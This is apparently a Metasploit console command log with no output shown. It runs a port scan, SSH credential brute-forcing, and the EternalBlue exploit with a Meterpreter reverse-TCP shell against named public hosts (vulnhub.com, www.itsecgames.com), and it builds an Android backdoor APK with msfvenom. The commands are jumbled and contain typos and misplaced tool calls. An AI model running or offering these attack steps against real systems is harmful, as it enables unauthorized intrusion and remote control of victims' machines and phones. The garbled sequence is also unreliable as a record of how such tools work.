msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 > getuid
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
msf6 auxiliary(scanner/portscan/tcp) > run
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > show options
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS vulnhub.com
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -l
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -o backdoor.apk
msf6 exploit(windows/smb/ms17_010_eternalblue) > PAYLOD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > quit
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS vulnhub.com
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > quit
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS www.itsecgames.com
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
